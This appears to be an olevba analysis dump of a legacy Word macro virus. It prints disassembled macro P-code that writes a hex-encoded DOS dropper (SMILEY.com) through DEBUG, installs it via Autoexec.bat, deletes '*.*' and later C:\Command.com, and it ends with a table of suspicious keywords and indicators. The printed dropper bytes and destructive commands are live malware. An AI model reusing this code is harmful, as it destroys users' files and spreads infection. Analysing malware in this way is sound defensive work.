' 	LitStr 0x0036 "E 0880 8E D8 8E C0 BA 44 07 B1 10 B4 4E CD 21 A1 79 07"
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0890 3D 47 07 74 08 B4 4F CD 21 B4 4F CD 21 3D 12 00"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08A0 74 2E B4 2F CD 21 83 C3 15 26 8A 07 3C 10 74 02"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08B0 EB E7 C7 06 7D 07 01 00 B4 2F CD 21 83 C3 1E 8B"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08C0 36 79 07 26 8A 07 88 04 3C 00 74 04 43 46 EB F3"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08D0 C3 A1 38 07 8E C0 A0 35 07 3C 00 74 06 BE 98 07"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08E0 EB 04 90 BE 8D 07 B9 07 00 8B 3E 79 07 F3 A4 FF"
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08F0 06 79 07 A1 38 07 8E D8 BA 44 07 B1 00 B4 4E CD"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0900 21 3D 00 00 75 57 B4 2F CD 21 83 C3 1E 8B 36 79"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0910 07 26 8A 07 88 04 3C 00 74 04 43 46 EB F3 BA 44"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0920 07 E8 9F FE 3D 00 00 74 2E B4 4F CD 21 3D 00 00"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0930 75 2B B4 2F CD 21 83 C3 1E 8B 36 79 07 26 8A 07"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0940 88 04 3C 00 74 04 43 46 EB F3 BA 44 07 E8 73 FE"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0950 3D 00 00 74 02 EB D2 C7 06 7B 07 01 00 C3 EB 10"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0960 90 14 14 14 14 00 00 20 00 00 18 15 00 00 00 00"
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0970 1E 50 53 51 52 06 56 8C C8 8E D8 8E C0 BE 00 00"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0980 8B 44 0C 3D 00 00 74 06 FF 4C 0C EB 57 90 8B 44"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0990 05 8A 5C 09 E8 59 00 8B 44 03 B3 02 E8 51 00 88"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09A0 5C 09 8B 44 03 89 44 05 8B 44 03 8B 5C 07 80 FF"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09B0 00 74 04 FE CC FE CC FE C4 80 FB 00 74 04 FE C8"
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09C0 FE C8 FE C0 80 FC 00 75 02 F6 D7 80 FC 50 75 02"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09D0 F6 D7 3C 00 75 02 F6 D3 3C 19 75 02 F6 D3 89 44"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09E0 03 89 5C 07 5E 07 5A 59 5B 58 1F 2E FF 2E 0E 00"
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09F0 86 C4 53 50 B5 20 B4 01 CD 10 B4 0F CD 10 B4 03"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A00 CD 10 89 54 0A 5A B4 02 CD 10 B4 08 CD 10 8A C8"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A10 58 51 B9 01 00 B4 0A CD 10 B5 0C B1 0D B4 01 CD"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A20 10 8B 54 0A B4 02 CD 10 5B C3 14 0B C7 07 0E 02"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A30 C8 07 32 00 00 01 01 01 A1 0D 05 00 80 00 69 0D"
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A40 9C B2 94 15 41 3A 5C 46 52 45 45 2E 43 4F 4D 00"
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A50 4D 00 00 5C 4D 41 50 4D 45 4D 2E 43 4F 4D 00 00"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A70 00 00 00 00 00 00 00 00 00 47 07 01 00 00 00 00"
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A80 00 00 00 00 00 00 00 00 00 00 00 00 00 5C 2A 2E"
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A90 45 58 45 00 2A 2E 2A 00 5C 2A 2E 43 4F 4D 00 07"
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AA0 00 E9 9E 00 E9 00 00 D5 FA FB 02 2F 00 4F 56 46"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AB0 79 41 4E 4B 45 45 20 44 6F 6F 64 6C 65 23 61 6E"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AC0 64 20 56 41 43 73 69 6E 2E 00 54 68 65 20 72 65"
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AD0 64 20 70 6C 61 6E 65 74 28 22 49 4E 76 61 73 69"
' 	PrintItemNL 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AE0 4F 6E 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #172:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EC 01"
' 	PrintItemNL 
' Line #174:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B10 02 00 01 3F 3F 3F 3F 3F 3F 3F 3F 43 4F 4D 00 06"
' 	PrintItemNL 
' Line #175:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B20 00 00 00 00 00 00 00 20 9C B2 94 15 FB 02 00 00"
' 	PrintItemNL 
' Line #176:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B30 46 52 45 45 2E 43 4F 4D 00 4D 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #178:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #179:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #181:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #182:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #183:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #184:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BB0 00 00 00 00 00 00 00 00 00 00 00 00 00 49 50 52"
' 	PrintItemNL 
' Line #185:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #186:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "0ABF"
' 	PrintItemNL 
' Line #187:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #188:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #189:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #190:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #191:
' 	LitStr 0x000A "SMILEY.BAT"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #193:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "debug<SMILEY.scr>nul"
' 	PrintItemNL 
' Line #194:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "SMILEY.com"
' 	PrintItemNL 
' Line #195:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Copy SMILEY.com C:\Mouse.com"
' 	Ld nul 
' 	Gt 
' 	PrintItemNL 
' Line #196:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #197:
' 	Reparse 0x002A "setattr_ "C:\Autoexec.bat" For Append As 1"
' Line #198:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #199:
' 	LitStr 0x000A "SMILEY.bat"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall Shell 0x0002 
' Line #200:
' 	LitStr 0x000A "SMILEY.bat"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #201:
' 	LitStr 0x000A "SMILEY.scr"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #202:
' 	LitStr 0x0003 "*.*"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #203:
' 	Label NoDropper 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	EndSub 
' Macros/VBA/Joke - 3028 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn aa
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn a
' Line #5:
' 	Dim 
' 	VarDefn DokumentSchliessen
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Hour 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Minute 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #7:
' 	LitStr 0x0024 "Hi, Iґm the FIRST GERMAN MACRO VIRII"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #8:
' 	LitStr 0x001D "O.k. Now I will Play with YOU"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #9:
' 	LitStr 0x001D " I can destroy Your harrdrive"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #10:
' 	LitStr 0x0022 " But I will only play with YOU :-)"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #11:
' 	LitStr 0x001B "First look down on the Page"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #12:
' 	LitStr 0x0048 " Hi, can You see me ????????????????????????????????????????????????????"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #13:
' 	LitStr 0x0014 "O.k. the second game"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #14:
' 	LitStr 0x001C "Now I let Your computer beep"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #15:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0064 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St aa 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aa 
' 	For 
' Line #17:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	LitStr 0x000E "The Third Game"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #22:
' 	LitStr 0x0031 "Now I let print a page,  Read the Information !!!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0000 
' Line #24:
' 	LitStr 0x0087 " Now itґs never a joke to play with      C O O L      Z E R O     You have 15 Minutes To find me, Then I will destroy YOUR Command.com "
' 	St a$ 
' Line #25:
' 	Ld a$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #26:
' 	Ld WordBasic 
' 	ArgsMemCall FilePrint 0x0000 
' Line #27:
' 	LitDI2 0x0002 
' 	St DokumentSchliessen 
' Line #28:
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0000 
' Line #29:
' 	ElseBlock 
' Line #30:
' 	Reparse 0x0057 "If WordBasic.Hour(WordBasic.Now() = 15 And WordBasic.Minute(WordBasic.Now()) = 15 Then)"
' Line #31:
' 	LitStr 0x000E "C:\Command.com"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |SMILEY.BAT          |Executable file name                         |
|IOC       |SMILEY.scr          |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |SMILEY.bat          |Executable file name                         |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

